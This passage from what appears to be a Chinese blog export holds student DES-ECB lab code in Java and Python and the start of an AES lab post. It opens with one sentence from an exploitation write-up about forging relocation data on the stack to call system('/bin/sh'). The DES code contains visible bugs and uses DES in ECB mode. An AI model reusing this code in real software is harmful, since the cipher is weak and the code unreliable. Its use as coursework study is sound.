link_map的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移，然后是返回地址（system的话无所谓），再然后是参数（如果是system函数的话就要是指向&quot;/bin/sh\\x00&quot;的指针）","categories":[],"tags":[]},{"title":"DES-ECB","slug":"DES-ECB","date":"2019-10-13T02:27:16.000Z","updated":"2019-10-13T17:27:56.000Z","comments":true,"path":"2019/10/12/DES-ECB/","link":"","permalink":"http://yoursite.com/2019/10/12/DES-ECB/","excerpt":"","text":"软件系统设计实现Feistel密码结构（64bit分组长度）单独通过一个Feistel函数抽象了Feistel结构 1234567891011def Feistel(ClearTxt,Key,Model): #Step 1 is CreateKey keylist = createkey(Key) print() if Model == 1: keylist = keylist if Model == 2: keylist = keylist[::-1] #INVERSEKEY #Step 2 is ClearTxt text = DES_ECB(ClearTxt,keylist) return text 通过不同的加密轮函数和密钥生成结构就可以组合成不同的Feistel密码，通过不同的Key生成函数可以生成不同的子密钥数组 DES算法实现初始置换实现Java实现： 1234567891011121314151617181920212223public int[] IP(int[] BinaryClearTxt)&#123; int[] IPTABLE = &#123;58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7&#125;; if(BinaryClearTxt.length != 64)&#123; System.out.println(\"Your key Text lenth is Error!\"); &#125; else &#123; for (int i = 0;i &lt; IPTABLE.length;i++)&#123; ret[i] = BinaryClearTxt[IPTABLE[i]-1]; &#125; System.out.print(\"Source ClearText : \"); for(int i = 0;i&lt;BinaryClearTxt.length;i++)&#123; System.out.print(BinaryClearTxt[i]); &#125; &#125; return ret; &#125; Python实现： 12345678910111213141516171819def IP(ClearTxt): IPTABLE = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7] if len(ClearTxt) != 64: print(\"Your key Text lenth is Error!\") assert len(ClearTxt) == 64 # if no 64bit error else: ret = \"\" for i in IPTABLE: ret = ret + ClearTxt[i - 1] print(\"Source ClearText : \",ClearTxt) print(\"IP Replace : \",ret) return ret 子密钥生成实现Java实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class Key&#123; int[] Movetimes = &#123;1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1&#125;; int[] PC_1_LTABLE = &#123;57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36&#125;; int[] PC_1_RTABLE = &#123;63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4&#125;; int[] PC_2_TABLE = &#123;14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32&#125;; public int[] Binarykey = new int[64]; public int[][] Sonkey = new int[16][48]; public int len = 0; public void set()//(test pass) set Binarykey &#123; Scanner scan = new Scanner(System.in); int[] tmp = new int[64]; System.out.println(\"Please input your Key ： \"); String tmpchar = scan.next(); HextoBin hexto = new HextoBin(); hexto.set(tmpchar); String str2 = hexto.out(); for(int i = 0;i &lt; 64;i++)&#123; Binarykey[i] = str2.charAt(i)-'0'; &#125; &#125; public int[] result(int[] txt,int count)&#123; int lenth = txt.length; int[] tmptxt = new int[lenth]; if(lenth &gt; 28)&#123; System.out.println(\"Your Result length is Error\"); &#125; else&#123; int tmpnum = 0; for(int i = count;i &lt; lenth ;i++)&#123; tmptxt[tmpnum] = txt[i]; tmpnum ++; &#125; for(int i = 0;i &lt; count;i++)&#123; tmptxt[tmpnum+i] = txt[i]; &#125; &#125; return tmptxt; &#125; public int[][] Main()&#123; int lenth = Binarykey.length; if(lenth != 64)&#123; System.out.println(\"Your Key lenth is Error\"); &#125; String BinarykeyST = \"\"; for(int i =0;i &lt; lenth;i++)&#123; BinarykeyST += Binarykey[i]; &#125; System.out.println(\"Your Binary Key is : \"+BinarykeyST); int[] L0 = new int[28]; int[] R0 = new int[28]; for(int i = 0;i &lt; PC_1_LTABLE.length;i++)&#123; L0[i] = Binarykey[PC_1_LTABLE[i] - 1]; &#125; for(int i = 0;i &lt; PC_1_LTABLE.length;i++)&#123; R0[i] = Binarykey[PC_1_RTABLE[i] - 1]; &#125; for(int i = 0;i &lt; 16;i++)&#123; L0 = result(L0,Movetimes[i]); R0 = result(R0,Movetimes[i]); int[] mergedKey = new int[56]; for(int j = 0;j &lt; 28;j++)&#123; mergedKey[j] = L0[j]; &#125; for(int j = 28;j &lt; 56;j++)&#123; mergedKey[j] = R0[j-28]; &#125; int[] tempkey = new int[48]; for(int j = 0;j &lt; PC_2_TABLE.length;j++)&#123; tempkey[j] = mergedKey[PC_2_TABLE[j]-1]; &#125; for(int j = 0;j&lt;48;j++)&#123; Sonkey[i][j] = tempkey[j]; &#125; &#125; return Sonkey; &#125;&#125; Python实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445def createkey(key): Movetimes = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] PC_1_LTABLE = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36] PC_1_RTABLE = [63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4] PC_2_TABLE = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32] if len(key) != 64 : print(\"Your Key lenth is Error!\") assert len(key) == 64#if no 64bit error else: L0 = \"\" R0 = \"\" for i in PC_1_LTABLE: L0 += key[i - 1] for i in PC_1_RTABLE: R0 += key[i - 1] assert len(L0) == 28 #if no 28bit error assert len(R0) == 28 Sonkey = [] for i in range(0, 16): print(\"Movetimes : \",i) L0 = result(L0, Movetimes[i]) R0 = result(R0, Movetimes[i]) print(\"L0 : \", L0) print(\"R0 : \", R0) mergedKey = L0 + R0 tempkey = \"\" for j in PC_2_TABLE: tempkey += mergedKey[j - 1] assert len(tempkey) == 48 print(\"Your NO.\",i,\" Sonkey :\",tempkey) Sonkey.append(tempkey) return Sonkey DES轮函数实现Java实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251class DES&#123; private static String intToHex(int n) &#123; StringBuffer s = new StringBuffer(); String a; char []b = &#123;'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'&#125;; while(n != 0)&#123; s = s.append(b[n%16]); n = n/16; &#125; a = s.reverse().toString(); return a; &#125; private static String hexStr = \"0123456789ABCDEF\"; private static String[] binaryArray = &#123;\"0000\",\"0001\",\"0010\",\"0011\", \"0100\",\"0101\",\"0110\",\"0111\", \"1000\",\"1001\",\"1010\",\"1011\", \"1100\",\"1101\",\"1110\",\"1111\"&#125;; public static String bin2HexStr(byte[] bytes)&#123; String result = \"\"; String hex = \"\"; for(int i=0;i&lt;bytes.length;i++)&#123; //字节高4位 hex = String.valueOf(hexStr.charAt((bytes[i]&amp;0xF0)&gt;&gt;4)); //字节低4位 hex += String.valueOf(hexStr.charAt(bytes[i]&amp;0x0F)); result +=hex; //+\" \" &#125; return result; &#125; String ClearTxt = \"\"; public int[] BinaryClearTxt = new int[64]; public int[][] Sonkey = new int[16][48]; int[] ret = new int[64]; public int[] IP(int[] BinaryClearTxt)&#123; int[] IPTABLE = &#123;58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7&#125;; if(BinaryClearTxt.length != 64)&#123; System.out.println(\"Your key Text lenth is Error!\"); &#125; else &#123; for (int i = 0;i &lt; IPTABLE.length;i++)&#123; ret[i] = BinaryClearTxt[IPTABLE[i]-1]; &#125; System.out.print(\"Source ClearText : \"); for(int i = 0;i&lt;BinaryClearTxt.length;i++)&#123; System.out.print(BinaryClearTxt[i]); &#125; &#125; return ret; &#125; public String expend(String Rn)&#123; int[] ETABLE = &#123;32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1&#125;; String retRn = \"\"; for(int i =0;i&lt;ETABLE.length;i++)&#123; retRn += Rn.charAt(ETABLE[i]-1); &#125; return retRn; &#125; public String S_sub(String S_Input)&#123; int[][] STABLE = &#123;&#123;14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13&#125;, &#123;15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9&#125;, &#123;10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12&#125;, &#123;7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14&#125;, &#123;2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3&#125;, &#123;12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13&#125;, &#123;4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12&#125;, &#123;13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11&#125;&#125;; String retstr = \"\"; while (S_Input.length()&lt;48)&#123; S_Input = \"0\" + S_Input; &#125; int index = 0; for(int i = 0;i &lt; 8;i++)&#123; int[] Slist = new int[64]; for(int j = 0;j &lt; 64;j++)&#123; Slist[j] = STABLE[i][j]; &#125; int row = (S_Input.charAt(index)-'0')*2+(S_Input.charAt(index+5)-'0'); int col = (S_Input.charAt(index+1)-'0')*8 + (S_Input.charAt(index+2)-'0')*4+(S_Input.charAt(index+3)-'0')*2+(S_Input.charAt(index+4)-'0'); String ret_single = Integer.toBinaryString(Slist[row*16+col]); while (ret_single.length() &lt; 4)&#123; ret_single = \"0\" + ret_single; &#125; retstr += ret_single; index += 6; &#125; if (retstr.length() != 32)&#123; System.out.println(\"Your S_sub retstr lenth is erroe!\\n\"); &#125; return retstr; &#125; public String[] P(String Ln,String S_sub_str,String Rn)&#123; int[] PTABLE = &#123;16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25&#125;; String tmp = \"\"; for(int i = 0;i &lt; PTABLE.length;i++)&#123; tmp += S_sub_str.charAt(PTABLE[i]-1); &#125; String Lnnew = \"\"; for(int i = 0;i &lt; tmp.length();i++)&#123; Lnnew += (tmp.charAt(i) - '0') ^ (Ln.charAt(i) - '0'); &#125; while (Lnnew.length()&lt;32)&#123; Lnnew = \"0\" + Lnnew; &#125; if (Lnnew.length()!=32)&#123; System.out.println(\"Your Lnnew lenth is error!\\n\"); &#125; Ln = Rn; Rn = Lnnew; String[] strstr = new String[2]; strstr[0] = Ln; strstr[1] = Rn; return strstr; &#125; public String IP_inverse(String L16,String R16)&#123; int[] IPINVERSETABLE = &#123;40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25&#125;; String tmp = L16 + R16; String retstr = \"\"; for(int i = 0;i &lt; IPINVERSETABLE.length;i++)&#123; retstr += tmp.charAt(IPINVERSETABLE[i] - 1); &#125; if (retstr.length() != 64)&#123; System.out.println(\"Your IP_inverse is error!\\n\"); &#125; return retstr; &#125; public void Main()&#123; Scanner scan = new Scanner(System.in); ClearTxt = scan.next(); HextoBin hexto = new HextoBin(); hexto.set(ClearTxt); String str2 = hexto.out(); for(int i = 0;i &lt; 64;i++)&#123; BinaryClearTxt[i] = str2.charAt(i)-'0'; &#125; BinaryClearTxt = IP(BinaryClearTxt); int[] tmpLn = new int[32]; int[] tmpRn = new int[32]; String Ln = \"\"; String Rn = \"\"; for(int i = 0;i &lt;32;i++)&#123; Ln += BinaryClearTxt[i]; &#125; for(int i = 32;i &lt;64;i++)&#123; Rn += BinaryClearTxt[i]; &#125; Key Key = new Key(); Key.set(); Sonkey = Key.Main(); for(int i = 0;i &lt;16;i++)&#123; int[] tmpkey = new int[48]; for(int j = 0;j &lt; 48;j++)&#123; tmpkey[j] = Sonkey[i][j]; &#125; while (Rn.length() &lt; 32)&#123; Rn = \"0\" + Rn; &#125; while (Ln.length() &lt; 32)&#123; Ln = \"0\" + Ln; &#125; String Rn_expand = expend(Rn); String S_input = \"\"; String S_sub_str = \"\"; for(int j =0;j&lt;48;j++)&#123; S_input += ((Rn_expand.charAt(j) - '0') ^ (tmpkey[j])); &#125; S_sub_str = S_sub(S_input); String[] StrStr = new String[2]; StrStr = P(Ln,S_sub_str,Rn); Ln = StrStr[0]; Rn = StrStr[1]; &#125; String tmpp = \"\"; tmpp = Ln; Ln = Rn; Rn = tmpp; String re_text = IP_inverse(Ln,Rn); int tmnum = 0; int tmindex = 0; int tmmindex = 3; String a = \"\"; for(int i =0;i &lt;64;i++)&#123; if(tmindex == 4)&#123; tmindex = 0; a += hexStr.charAt(tmnum); tmnum = 0; tmmindex = 3; &#125; tmnum += Math.pow(2,tmmindex) * (re_text.charAt(i) - '0'); tmmindex --; tmindex ++; if(i == 63)&#123; a += hexStr.charAt(tmnum); &#125; &#125; System.out.println(\"Your DES Result is : \"+re_text); System.out.println(\"Your DES Result is : \"+tmnum); System.out.println(\"Your DES Result is : \"+a); &#125;&#125; Python实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107def expend(Rn): ETABLE = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1] retRn = \"\" for i in ETABLE: retRn += Rn[i - 1] assert len(retRn) == 48 return retRndef S_sub(S_Input): STABLE = [(14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13), (15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9), (10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12), (7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14), (2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3), (12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13), (4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12), (13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11)] S_Input = bin(S_Input)[2:] while len(S_Input) &lt; 48: S_Input = \"0\" + S_Input index = 0 retstr = \"\" for Slist in STABLE: row = int(S_Input[index] + S_Input[index + 5], base=2) col = int(S_Input[index + 1:index + 5], base=2) ret_single = bin(Slist[row * 16 + col])[2:] while len(ret_single) &lt; 4: ret_single = \"0\" + ret_single retstr += ret_single index += 6 assert len(retstr) == 32 return retstrdef P(Ln, S_sub_str, oldRn): PTABLE = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25] tmp = \"\" for i in PTABLE: tmp += S_sub_str[i - 1] LnNew = int(tmp, base=2) ^ int(Ln, base=2) LnNew = bin(LnNew)[2:] while len(LnNew) &lt; 32: LnNew = \"0\" + LnNew assert len(LnNew) == 32 (Ln, Rn) = (oldRn, LnNew) return (Ln, Rn)def IP_inverse(L16, R16): IPINVERSETABLE = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25] tmp = L16 + R16 retstr = \"\" for i in IPINVERSETABLE: retstr += tmp[i - 1] assert len(retstr) == 64 return retstrdef DES_ECB(ClearTxt,Keylist): InitKeyCode = IP(ClearTxt) Ln = InitKeyCode[0:32] Rn = InitKeyCode[32:] for key in Keylist: while len(Rn) &lt; 32: Rn = \"0\" + Rn while len(Ln) &lt; 32: Ln = \"0\" + Ln print(\"Ln : \",Ln) print(\"Rn : \", Rn) Rn_expand = expend(Rn) print(\"Rn_expand : \",Rn_expand) S_Input = int(Rn_expand, base=2) ^ int(key, base=2) print(\"S_Input : \", S_Input) S_sub_str = S_sub(S_Input) print(\"S_sub_str : \", S_sub_str) (Ln, Rn) = P(Ln, S_sub_str, Rn) (Ln, Rn) = (Rn, Ln) re_text = IP_inverse(Ln, Rn) return re_text 加密分组实现123456789101112131415161718192021222324252627282930def Encryptmohex(tmplist): str_bin = ''.join(tmplist) groups = int(len(str_bin) / 64) # 生成加密分组 M = np.zeros((groups, 64)) index = -8 for i in range(groups): index += 8 strr = \"\" for j in range(8): strr += tmplist[index + j] for j in range(64): M[i][j] = int(strr[j]) print(\"Your List Clear Text: \", tmplist) print(\"Your Binary Clear Text: \", str_bin) print(\"Your Hex Clear Text: \", hex(int(str_bin, base=2)).upper()) print(\"Your Clear Text groups: \", groups) key_bin = inkey() # 打印加密群 AllCiphertext = \"\" for i in range(groups): print(\"ClearText Group \", i, \": \", end='') tmptext = \"\" for j in range(64): tmptext += str(int(M[i][j])) ciphertext = Feistel(tmptext, key_bin, 1) AllCiphertext += ciphertext print(\"Ciphertext: \", ciphertext) print(\"Your Binary Ciphertext: \", AllCiphertext) print(\"Your Hex Ciphertext: \", hex(int(AllCiphertext, base=2)).upper()) 解密分组实现主函数同加密分组实现，只需要把密钥取反即可 1keylist = keylist[::-1] #INVERSEKEY 附加内容用电码本模式对文件进行加密和解密12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879def opentxt(): f = open('/tmp/test.txt') str1 = \"\" while true: str1 = f.readline() return str1def Encryptmostr(text): lenth = len(text) flag = 0 offset = 0 # 补位操作 if (lenth % 8 == 0): flag = 0 else: flag = 1 offset = 8 - lenth % 8 for i in range(offset): text += 'A' tmplist = encode(text) groups = int(len(tmplist) / 8) #对齐8位 for i in range(len(tmplist)): if len(tmplist[i]) != 8: tmpp = \"\" for j in range(8 - len(tmplist[i])): tmpp += '0' tmplist[i] = tmpp + tmplist[i] str_bin = ''.join(tmplist) #生成加密分组 M = np.zeros((groups, 64)) index = -8 for i in range(groups): index += 8 strr = \"\" for j in range(8): for k in tmplist[index+j]: strr += k for j in range(64): M[i][j] = int(strr[j]) print(\"Your List Clear Text: \",tmplist) print(\"Your Binary Clear Text: \",str_bin) print(\"Your Hex Clear Text: \", hex(int(str_bin, base=2)).upper()) print(\"Your Clear Text offset: \", offset) print(\"Your Clear Text groups: \", groups) key_bin = inkey() #打印加密群 AllCiphertext = \"\" for i in range(groups): print(\"ClearText Group \", i) tmptext = \"\" for j in range(64): tmptext += str(int(M[i][j])) ciphertext = Feistel(tmptext, key_bin, 1) AllCiphertext += ciphertext print(\"Ciphertext: \",ciphertext) print(\"Your Binary Ciphertext: \",AllCiphertext) print(\"Your Hex Ciphertext: \", hex(int(AllCiphertext, base=2)).upper())def encode(s):#字符串转二进制 tmp = [] for c in s: tmp.append(bin(ord(c)).replace('0b', '')) str_bin = ' '.join(tmp) for i in range(len(tmp)): if len(tmp[i]) != 7: tmpp = \"\" for j in range(7-len(tmp[i])): tmpp += '0' tmp[i] = tmpp + tmp[i] return tmpdef ParityCheck(s):#偶校验 num = 0 for i in s: if i == '1': num = num +1 if num%2 == 0: s += '0' else: s += '1' return s 自定义轮函数F(W,K)=(1&lt;&lt;W)+K, 即W先循环左移1位再与K异或 1234567def DIYDES(ClearTxt,Key,Model): keylist = createkey(Key) InitKeyCode = IP(ClearTxt) for key in Keylist: InitKeyCode = InitKeyCode &lt;&lt; 1; InitKeyCode = InitKeyCode ^ key return InitKeyCode 重要的实现细节 随机密钥的生成 123456789101112131415161718192021if model == \"y\": tmplist = [] for i in range(8): j = random.randint(1,3) if j == 1: tmplist.append(chr(random.randint(48, 57))) if j == 2: tmplist.append(chr(random.randint(65, 90))) if j == 3: tmplist.append(chr(random.randint(97, 122))) for i in tmplist: strr += i keylist = encode(strr) # 补充奇偶校验位 for i in range(len(keylist)): keylist[i] = ParityCheck(keylist[i]) key_bin = ''.join(keylist) print(\"Your Key: \", strr) print(\"Your Binary Key: \", key_bin) print(\"Your Hex Key: \", hex(int(key_bin, base=2)).upper()) return key_bin 校验位的生成和补位操作 1234567891011121314151617def ParityCheck(s):#偶校验 num = 0 for i in s: if i == '1': num = num +1 if num%2 == 0: s += '0' else: s += '1' return s # 补充奇偶校验位 for i in range(len(keylist)): keylist[i] = ParityCheck(keylist[i]) key_bin = ''.join(keylist) print(\"Your Key: \", strr) print(\"Your Binary Key: \", key_bin) print(\"Your Hex Key: \", hex(int(key_bin, base=2)).upper()) 实现效果实现文本加密 实现十六进制输入加密 实现二进制输入解密 总结系统亮点 实现了完成的Feistel密码结构的分层 实现了Key轮加密密钥的类抽象 实现了随机密钥的生成方法 提供了包括二进制、十六进制、字符串、文本文件在内的多种输入方式 提供了自定义轮函数的接口","categories":[],"tags":[]},{"title":"AES-ECB","slug":"AES-ECB","date":"2019-10-13T02:24:07.000Z","updated":"2019-10-13T17:26:08.000Z","comments":true,"path":"2019/10/12/AES-ECB/","link":"","permalink":"http://yoursite.com/2019/10/12/AES-ECB/","excerpt":"","text":"实验要求 实现GF(28)加法与乘法运算并验算正确性 算法运算采用多项式表示法 加法运算实际上就是按位异或 乘法运算实现要利用XTime运算来设计算法，取模11B 要用课本的例子验算是否正确实现 实现系数在GF(28)上的多项式的乘法 运算是4字节向量乘4字节向量（向量的分量表示多项式的系数） 输出是4字节向量 运算过程，字节对字节的加法就是异或，乘法需调用第1步实现的乘法 AES算法实现 输入：Nb, Nk, 明文分组，种子密钥， 输出：密文分组 明文分组以字符串形式输入，密文分组以16进制形式输出，密钥的输入形式自行设计 实现字节代换ByteSub及逆代换InvByteSub 实现行移位ShiftRow及逆行移位InvShiftRow 实现列混淆MixColum及逆列混淆InvMixcColumn，注意，（逆）列混淆实现需要调用第2步实现的多项式乘法 用密钥编排算法获取轮密钥 实现AES加密与解密，注意加密密钥与解密密钥次序与差别 附加内容 用代码自动生成字节替换所用的S盒与逆S盒 实验原理高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图： 下面简单介绍下各个部分的作用与意义： 明文P 没有经过加密的数据。 密钥K 